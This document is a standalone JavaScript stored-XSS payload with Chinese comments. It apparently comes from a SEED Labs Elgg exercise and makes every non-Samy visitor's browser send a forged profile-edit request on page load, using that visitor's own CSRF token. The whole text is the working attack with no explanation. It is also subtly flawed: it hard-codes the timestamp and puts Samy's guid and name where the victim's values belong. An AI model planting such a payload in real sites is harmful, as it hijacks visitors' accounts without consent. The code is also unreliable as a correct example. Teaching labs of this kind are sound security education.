<script type="text/javascript">
window.onload = function() {
    var ts = "&__elgg_ts=1719777533";
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var guid = "&guid=59";
    var userName = "&name=Samy";
    var newDescription = "&description=Modified by Samy";

    // 构造修改内容的URL和数据
    var content = ts + token + guid + userName + newDescription;
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    // 检查用户是否不是Samy本人
    if (elgg.session.user.guid != "59") {
        // 创建并发送Ajax请求以修改个人资料
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
};
</script>